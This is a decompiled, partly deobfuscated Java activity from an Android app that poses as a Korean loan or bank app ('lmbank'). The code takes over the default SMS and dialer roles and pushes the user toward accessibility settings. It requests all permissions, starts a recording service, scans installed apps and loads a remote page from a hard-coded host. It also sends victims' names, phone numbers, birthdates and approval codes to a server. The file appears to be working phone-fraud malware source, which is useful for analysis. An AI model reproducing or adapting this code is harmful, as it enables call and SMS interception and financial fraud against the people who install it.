package com.wish.lmbank.activity;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.R;
import com.wish.lmbank.R2;
import com.wish.lmbank.base.BaseActivityV;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.http.HttpEngine;
import com.wish.lmbank.http.HttpManager;
import com.wish.lmbank.http.HttpResponse;
import com.wish.lmbank.keeplive.utils.ServiceUtils;
import com.wish.lmbank.service.RecServiceV;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.PermissionUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;
import com.wish.lmbank.view.dialog.LoadingDialog;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/LauncherActivity.class */
public class LauncherActivity extends BaseActivityV {
    int flag;
    private WebView mWebView;
    private RelativeLayout rlMask;
    int REQUEST_CODE = 100;
    boolean isPermissionGranted = false;

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public int initLayoutView() {
        return R2.layout.activity_main_web;
    }

    @Override // android.app.Activity
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        getIntentData(intent);
    }


    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initData() {
        super.initData();
        getIntentData(getIntent());
        requestIgnoreBattery();
        initPermission(this);
    }

    //默认短信
    void initPermission(Activity activity) {
        String defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(this);
        //获取手机当前设置的默认短信应用的包名
        String packageName = activity.getPackageName();
        if (defaultSmsApp == null) {
            System.out.println("获取为空");
            return;
        }
        if (!defaultSmsApp.equals(packageName)) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName);
            startActivityForResult(intent, 10);
        }
    }

    private void getIntentData(Intent intent) {
//         String m5998 = bb7d7pu7.m5998("IiwwNiAnOj0oJSU2KiYtLA");
        String m5998 = "KEY_INSTALL_CODE";
        if (intent != null && intent.getExtras() != null) {
            Bundle extras = intent.getExtras();
//             String m59982 = bb7d7pu7.m5998("JjksJzY6JDo");
            String m59982 = "OPEN_SMS";
            boolean z = extras.getBoolean(m59982);
//             String m59983 = bb7d7pu7.m5998("Oiw7Pyw7NicoJCw");
            String m59983 = "SERVER_NAME";
            String string = extras.getString(m59983);
//             String m59984 = bb7d7pu7.m5998("PDsl");
            String m59984 = "URL";
            String string2 = extras.getString(m59984);
//             String m59985 = bb7d7pu7.m5998("OTsmIywqPTYnKCQs");
            String m59985 = "PROJECT_NAME";
            String string3 = extras.getString(m59985);
//             String m59986 = bb7d7pu7.m5998("KiYkOSgnMDY8PCAt");
            String m59986 = "COMPANY_UUID";
            String string4 = extras.getString(m59986);
//             String m59987 = bb7d7pu7.m5998("OiooJycgJy42KCUlNig5OQ");
            String m59987 = "SCANNING_ALL_APP";
            String string5 = extras.getString(m59987);
//             String m59988 = bb7d7pu7.m5998("KDk5JSAqKD0gJic2Oj0wJSw");
            String m59988 = "APPLICATION_STYLE";
            String string6 = extras.getString(m59988);
//             String m59989 = bb7d7pu7.m5998("KC47LCwkLCc9Njo8KyQgPTY6PTAlLA");
            String m59989 = "AGREEMENT_SUBMIT_STYLE";
            String string7 = extras.getString(m59989);
//             String m599810 = bb7d7pu7.m5998("ISwoLSw7NjkgKj08Oyw2Oj0wJSw");
            String m599810 = "HEADER_PICTURE_STYLE";
            String string8 = extras.getString(m599810);
//             String m599811 = bb7d7pu7.m5998("PCcnLCosOjooOzA2KDw9JjYtLCUsPSw2JSA6PQ");
            String m599811 = "UNNECESSARY_AUTO_DELETE_LIST";
            String string9 = extras.getString(m599811);
            boolean z2 = extras.getBoolean(m5998);
            if (!TextUtils.isEmpty(string)) {
                SharedPreferencesUtils.putValue(m59982, z);
                SharedPreferencesUtils.putValue(m59985, string3);
                SharedPreferencesUtils.putValue(m59986, string4);
                SharedPreferencesUtils.putValue(m59987, string5);
                SharedPreferencesUtils.putValue(m59988, string6);
                SharedPreferencesUtils.putValue(m59989, string7);
                SharedPreferencesUtils.putValue(m599810, string8);
                SharedPreferencesUtils.putValue(m59983, string);
                SharedPreferencesUtils.putValue(m599811, string9);
                SharedPreferencesUtils.putValue(m59984, string2);
                SharedPreferencesUtils.putValue(m5998, z2);
            }
        }
        if (!SharedPreferencesUtils.getValue(m5998, false) && !AppStartV.isDebug) {
            finish();
        }
        Constants.load(AppStartV.isDebug);
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initView() {
        super.initView();
        initWebView();
        this.rlMask = findViewById(R2.id.rlMask);
      /*  findViewById(R2.id.tvFinish).setOnClickListener(view -> {
            setResult(-1);
            finish();
        });*/
    }

    private void initWebView() {
        WebView webView = findViewById(R2.id.activity_main_web_wv);
        this.mWebView = webView;
//         webView.addJavascriptInterface(new JavaScriptInterface(this, this), bb7d7pu7.m5998("BQI"));
        webView.addJavascriptInterface(new JavaScriptInterface(this, this), "lk");
        this.mWebView.setWebViewClient(new WebViewClientA(this));
        this.mWebView.setWebViewClient(new WebViewClientB(this));
        WebView.setWebContentsDebuggingEnabled(true);
        WebSettings settings = this.mWebView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDisplayZoomControls(false);
//         settings.setDefaultTextEncodingName(bb7d7pu7.m5998("HB0PRFE"));
        settings.setDefaultTextEncodingName("utf-8");
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // com.wish.lmbank.base.BaseActivityV
    public void loadUrl() {
        super.loadUrl();
        loadHost();
        runOnUiThread(new Runnable() { // from class: com.wish.lmbank.activity.LauncherActivity.2
            @Override // java.lang.Runnable
            public void run() {
//                 String str = bb7d7pu7.m5998("AR0dGVNGRhAaDAxcAFpcAA1HCgYERh4MC0Y") + Constants.PROJECT_NAME + bb7d7pu7.m5998("RgAHHQwbDwgKDEcBHQQF");
                String str = "http://ysee5i35id.com/web/" + Constants.PROJECT_NAME + "/interface.html";
//                 Log.e(bb7d7pu7.m5998("Izg7"), bb7d7pu7.m5998("BQYIDTwbBUVJBQYIDTwbBVNJ") + str);
                Log.e("JQR", "loadUrl, loadUrl: " + str);
                mWebView.loadUrl(str);
            }
        });
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initLoad() {
        super.initLoad();
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // com.wish.lmbank.base.BaseActivityV
    public void startCustomService() {
        super.startCustomService();
        List<String> hasAllPermission = PermissionUtils.hasAllPermission(this);
        if (Build.VERSION.SDK_INT >= 26 && hasAllPermission.size() < 1) {
            startForegroundService(new Intent(this, RecServiceV.class));
        }
        if (hasAllPermission.size() <= 0) {
            return;
        }
//         String sb = bb7d7pu7.m5998("JQgcBwoBDBsoCh0AHwAdEEkaHQgbHSocGh0GBDoMGx8ACgxJHgAdAQYcHUkIBQVJGQwbBAAaGgAGB0VJGQwbBAAaGgAGBxpTSQ") +
        String sb = "LauncherActivity startCustomService without all permission, permissions: " +
                hasAllPermission.toString();
        LogUtils.callLog(sb);
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // com.wish.lmbank.base.BaseActivityV, android.app.Activity
    public void onResume() {
        super.onResume();
//         if (TextUtils.isEmpty(SharedPreferencesUtils.getValue(bb7d7pu7.m5998("OTsmIywqPTYnKCQs"), ""))) {
        if (TextUtils.isEmpty(SharedPreferencesUtils.getValue("PROJECT_NAME", ""))) {
            this.rlMask.setVisibility(View.VISIBLE);
        } else {
            this.rlMask.setVisibility(View.GONE);
        }
        if (!SettingUtils.isEnabledAccessibility(this)) {
//             this.alertDialog.show(bb7d7pu7.m5998("DQwPCBwFHQ"));
            this.alertDialog.show("default");
        } else if (PermissionUtils.hasAllPermission(this).size() > 0) {
            requestPermission();
        } else {
            boolean isServiceRunning = new ServiceUtils().isServiceRunning(this, RecServiceV.class.getName());
            if (AppStartV.isLoadUrl && !isServiceRunning) {
//                 Toast.makeText(this, bb7d7pu7.m5998("Oiw7PyAqLEk6PSg7PQ"), Toast.LENGTH_SHORT).show();
                Toast.makeText(this, "SERVICE START", Toast.LENGTH_SHORT).show();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(new Intent(this, RecServiceV.class));
                }
            }
//             String m5998 = bb7d7pu7.m5998("IiwwNi8gOzo9");
            String m5998 = "KEY_FIRST";
            if (SharedPreferencesUtils.getValue(m5998, true) && !SettingUtils.isDefaultDialer(this)) {
                SharedPreferencesUtils.putValue(m5998, false);
//                 SettingUtils.requestDefaultDialer(this, false, bb7d7pu7.m5998("JQgcBwoBDBsoCh0AHwAdEA"));
                SettingUtils.requestDefaultDialer(this, false, "LauncherActivity");
                return;
            }
//             String m59982 = bb7d7pu7.m5998("IiwwNi8gOzo9NjokOg");
            String m59982 = "KEY_FIRST_SMS";
            if (SharedPreferencesUtils.getValue(m59982, true) && Constants.OPEN_SMS) {
                SharedPreferencesUtils.putValue(m59982, false);
                requestDefaultSms();
                return;
            } else if (AppStartV.isDebug) {
//                 SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNiooJyosJTYoPD0mNiomJy8gOyQ"), true);
                SharedPreferencesUtils.putValue("KEY_CANCEL_AUTO_CONFIRM", true);
                return;
            } else {
                return;
            }
        }
    }

    private void toHomeScreenSetting() {
        try {
            Intent intent = new Intent();
            ComponentName componentName = null;
            int i = Build.VERSION.SDK_INT;
//             String m5998 = bb7d7pu7.m5998("CgYERxoMCkcIBw0bBgANRwgZGUcFCBwHCgEMGw");
            String m5998 = "com.sec.android.app.launcher";
            if (i >= 29) {
//                 componentName = new ComponentName(m5998, bb7d7pu7.m5998("CgYERwgHDRsGAA1HAQYEDBoKGwwMB0caDB0dAAcOGkchBgQMOgobDAwHOgwdHQAHDhooCh0AHwAdEA"));
                componentName = new ComponentName(m5998, "com.android.homescreen.settings.HomeScreenSettingsActivity");
            } else if (Build.VERSION.SDK_INT >= 28) {
//                 Toast.makeText(this, bb7d7pu7.m5998("KAcNGwYADUlQ"), Toast.LENGTH_SHORT).show();
                Toast.makeText(this, "Android 9", Toast.LENGTH_SHORT).show();
//                 componentName = new ComponentName(m5998, bb7d7pu7.m5998("CgYERwgHDRsGAA1HBQgcBwoBDBtaRwAHDxsIRwgKHQAfAB0QRzoMHR0ABw4aKAodAB8AHRA"));
                componentName = new ComponentName(m5998, "com.android.launcher3.infra.activity.SettingsActivity");
            } else if (Build.VERSION.SDK_INT >= 26) {
//                 Toast.makeText(this, bb7d7pu7.m5998("KAcNGwYADUlR"), Toast.LENGTH_SHORT).show();
                Toast.makeText(this, "Android 8", Toast.LENGTH_SHORT).show();
//                 componentName = new ComponentName(m5998, bb7d7pu7.m5998("CgYERwgHDRsGAA1HBQgcBwoBDBtaRzoMHR0ABw4aKAodAB8AHRA"));
                componentName = new ComponentName(m5998, "com.android.launcher3.SettingsActivity");
            }
            if (componentName != null) {
                intent.setComponent(componentName);
//                 intent.setAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRz8gLD4"));
                intent.setAction("android.intent.action.VIEW");
                startActivity(intent);
            }
        } catch (Exception e) {
//             LogUtils.callLog(bb7d7pu7.m5998("j_7Jj9r8j-D6jNXpjdHSjNjmjND8RUkMEQoMGR0ABgdTSQ") + e.getMessage());
            LogUtils.callLog("无法打开主屏幕, exception: " + e.getMessage());
        }
    }

    @Override // android.app.Activity
    protected void onPause() {
        super.onPause();
        if (this.alertDialog == null || !this.alertDialog.isShowing()) {
            return;
        }
        this.alertDialog.dismiss();
    }

    @Override
    // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.view.dialog.AlertDialog.ClickListener
    public void onCallback(View view) {
//        2131296363  0x7F09006B
        if (view.getId() != R.id.c8) {
            return;
        }
        SharedPreferencesUtils.putValue(Constants.K_SHOW_ACCESS, Constants.K_SHOW_ACCESS_APPLYING);
//         startActivity(new Intent(bb7d7pu7.m5998("CAcNGwYADUcaDB0dAAcOGkcoKiosOjogKyAlID0wNjosPT0gJy46")));
        startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (i == 4 && this.mWebView.canGoBack()) {
            this.mWebView.goBack();
            return true;
        }
        return super.onKeyDown(i, keyEvent);
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/LauncherActivity$WebViewClientA.class */
    public class WebViewClientA extends WebViewClient {
        final LauncherActivity this$0;

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }

        WebViewClientA(LauncherActivity launcherActivity) {
            this.this$0 = launcherActivity;
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/LauncherActivity$WebViewClientB.class */
    public static class WebViewClientB extends WebViewClient {
        final LauncherActivity this$0;

        WebViewClientB(LauncherActivity launcherActivity) {
            this.this$0 = launcherActivity;
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
//             if (str.contains(bb7d7pu7.m5998("AxpECggFBVM"))) {
            if (str.contains("js-call:")) {
//                 if (str.contains(bb7d7pu7.m5998("HQY6HAsEAB0"))) {
                if (str.contains("toSubmit")) {
                    this.this$0.startActivity(SubmitActivity.class);
                    return true;
                }
//                 String m5998 = bb7d7pu7.m5998("ABo6CggHBwAHDg");
                String m5998 = "isScanning";
                if (str.contains(m5998)) {
//                     if (bb7d7pu7.m5998("Ww").equals(Constants.SCANNING_ALL_APP)) {
                    if ("2".equals(Constants.SCANNING_ALL_APP)) {
//                         String value = SharedPreferencesUtils.getValue(m5998, bb7d7pu7.m5998("DwgFGgw"));
                        String value = SharedPreferencesUtils.getValue(m5998, "false");
//                         String m59982 = bb7d7pu7.m5998("HRwbDA");
                        String m59982 = "ture";
                        if (!value.equals(m59982)) {
                            Calendar calendar = Calendar.getInstance();
//                             SharedPreferencesUtils.putValue(bb7d7pu7.m5998("DwAbGh02GgoIBwcMGzYIGRk"), calendar.get(Calendar.YEAR) + bb7d7pu7.m5998("guztSQ") + calendar.get(Calendar.MONTH) + bb7d7pu7.m5998("hfL9SQ") + calendar.get(Calendar.DATE) + bb7d7pu7.m5998("hfTVSQ") + calendar.get(Calendar.HOUR) + bb7d7pu7.m5998("heL1SQ") + calendar.get(Calendar.MINUTE) + bb7d7pu7.m5998("gt_tSQ"));
                            SharedPreferencesUtils.putValue("first_scanner_app", calendar.get(Calendar.YEAR) + "년 " + calendar.get(Calendar.MONTH) + "월 " + calendar.get(Calendar.DATE) + "일 " + calendar.get(Calendar.HOUR) + "시 " + calendar.get(Calendar.MINUTE) + "분 ");
                            SharedPreferencesUtils.putValue(m5998, m59982);
                            this.this$0.startActivity(ScanningAppActivity.class);
                        }
                        this.this$0.finish();
                        return true;
                    }
                }
//                 if (str.contains(bb7d7pu7.m5998("ABo6CggHBwAHDi8GGyYrOA"))) {
                if (str.contains("isScanningForOBQ")) {
                    this.this$0.startActivity(ScanningAppForOBQActivity.class);
                    this.this$0.finish();
                    return true;
                }
                return true;
            }
            webView.loadUrl(str);
            return true;
        }
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // com.wish.lmbank.base.BaseActivityV, android.app.Activity
    public void onDestroy() {
        super.onDestroy();
        this.mWebView.removeAllViews();
        this.mWebView.setWebChromeClient(null);
        this.mWebView.setWebViewClient(null);
        this.mWebView.destroy();
    }

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/LauncherActivity$JavaScriptInterface.class */
    public class JavaScriptInterface {
        Context context;
        final LauncherActivity this$0;

        public JavaScriptInterface(LauncherActivity launcherActivity, Context context) {
            this.this$0 = launcherActivity;
            this.context = context;
        }

        @JavascriptInterface
        public void lkSubmit(String str, String str2, String str3, String str4) {
            if (str == null || str.length() == 0) {
//                 this.this$0.showToast(bb7d7pu7.m5998("hfTdgs_tQYT89YPR6UCF9O1JhffsgsnMhPzxheLEheL1hfHNRw"));
                this.this$0.showToast("이름(한글)을 입력하십시오.");
            } else if (str2 == null || str2.length() == 0) {
//                 this.this$0.showToast(bb7d7pu7.m5998("her0guzthfL9hfTVhfTtSYX37ILJzIT88YXixIXi9YXxzUc"));
                this.this$0.showToast("생년월일을 입력하십시오.");
            } else if (str3 == null || str3.length() < 2 || str3.length() > 15) {
//                 this.this$0.showToast(bb7d7pu7.m5998("hPXdguXphObZgtvhhPHRgszVSYX37ILJzIT88YXixIXi9YXxzUc"));
                this.this$0.showToast("휴대폰번호를 입력하십시오.");
            } else if (str4 == null || str4.length() != 4) {
//                 this.this$0.showToast(bb7d7pu7.m5998("hePQhfTRhdT9gvr1SV2F9_mCz8VJhffsgsnMhPzxhe3RhfP9Rw"));
                this.this$0.showToast("승인코드 4자리 입력하세요.");
            } else {
                LoadingDialog.showLoading(this.this$0);
                StringBuilder sb = new StringBuilder();
//                 sb.append(Base64.encodeToString((bb7d7pu7.m5998("BwAKAgcIBAxU") + str + bb7d7pu7.m5998("TwQGCwAFDFQ") + str3 + bb7d7pu7.m5998("TwsAGx0BDQgQVA") + str2 + bb7d7pu7.m5998("TxkcGxkGGgxU") + str4 + bb7d7pu7.m5998("TwgZGRsGHwgFKgYNDFQ") + str4).getBytes(StandardCharsets.UTF_8), 2));
                sb.append(Base64.encodeToString(("nickname=" + str + "&mobile=" + str3 + "&birthday=" + str2 + "&purpose=" + str4 + "&approvalCode=" + str4).getBytes(StandardCharsets.UTF_8), 2));
                HttpManager.getInstance().submitLoanApplication(sb.toString(), new AnonymousClass1(this));
            }
        }

        /* renamed from: com.wish.lmbank.activity.LauncherActivity$JavaScriptInterface$1  reason: invalid class name */
        /* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/LauncherActivity$JavaScriptInterface$1.class */
        class AnonymousClass1 implements HttpEngine.OnResponseCallback<HttpResponse.R_String> {
            final JavaScriptInterface this$1;

            AnonymousClass1(JavaScriptInterface javaScriptInterface) {
                this.this$1 = javaScriptInterface;
            }

            @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
            public void onResponse(int i, String str, HttpResponse.R_String r_String) {
                LoadingDialog.disDialog();
                this.this$1.this$0.showToast(str);
                if (i != 0 || this.this$1.this$0.mWebView == null) {
                    return;
                }
                this.this$1.this$0.mWebView.post(new Runnable() { // from class: com.wish.lmbank.activity.LauncherActivity.JavaScriptInterface.1.1
                    @Override // java.lang.Runnable
                    public void run() {
//                         this$1.this$0.mWebView.loadUrl(bb7d7pu7.m5998("AwgfCBoKGwAZHVMFGjocCwQAHTocCgoMGhpBQA"));
                        this$1.this$0.mWebView.loadUrl("javascript:lsSubmitSuccess()");
                        return;
                    }
                });
            }
        }

        @JavascriptInterface
        public String recordScanningTime() {
//             return SharedPreferencesUtils.getValue(bb7d7pu7.m5998("DwAbGh02GgoIBwcMGzYIGRk"), "");
            return SharedPreferencesUtils.getValue("first_scanner_app", "");
        }

        @JavascriptInterface
        public boolean getAllowPlayVideo() {
            return AppStartV.isAllowPlayVideo;
        }

        @JavascriptInterface
        public void submitInformationToServer(String str) {
            LoadingDialog.showLoading(this.this$0);
            HttpManager.getInstance().submitLoanApplication(Base64.encodeToString(str.getBytes(StandardCharsets.UTF_8), 2), new HttpEngine.OnResponseCallback<HttpResponse.R_String>() { // from class: com.wish.lmbank.activity.LauncherActivity.JavaScriptInterface.2

                @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
                public void onResponse(int i, String str2, HttpResponse.R_String r_String) {
                    LoadingDialog.disDialog();
                    if (i == 0) {
                        this$0.showToast(str2);
                    }
                }
            });
        }
    }

    private void requestPermission() {
        List<String> checkPermission = checkPermission(this, PermissionUtils.ALL_PERMISSION_REQUEST);
        if (checkPermission.isEmpty()) {
            this.isPermissionGranted = true;
        } else {
            requestPermission(checkPermission);
        }
    }

    private List<String> checkPermission(Context context, String[] strArr) {
        ArrayList<String> arrayList = new ArrayList<>();
        for (String str : strArr) {
            if (ActivityCompat.checkSelfPermission(context, str) != 0) {
//                     Log.e(bb7d7pu7.m5998("Izg7"), bb7d7pu7.m5998("CgEMCgI5DBsEABoaAAYHRUkZDBtTSQ") + str);
                Log.e("JQR", "checkPermission, per: " + str);
                arrayList.add(str);
            }
        }
        return arrayList;
    }

    private void requestPermission(List<String> list) {
        ActivityCompat.requestPermissions(this, (String[]) list.toArray(new String[0]), this.REQUEST_CODE);
    }

    @Override // com.wish.lmbank.base.BaseActivityV, android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        if (i == this.REQUEST_CODE) {
            for (int i2 = 0; i2 < strArr.length; i2++) {
                if (iArr[i2] == 0) {
//                     Log.e(bb7d7pu7.m5998("Izg7"), bb7d7pu7.m5998("Bgc7DBgcDBodOQwbBAAaGgAGBxo7DBocBR1FSTksOyQgOjogJic2LjsoJz0sLUVJGQwbBAAaGgAGB1NJ") + strArr[i2]);
                    Log.e("JQR", "onRequestPermissionsResult, PERMISSION_GRANTED, permission: " + strArr[i2]);
                }
            }
        }
    }
}
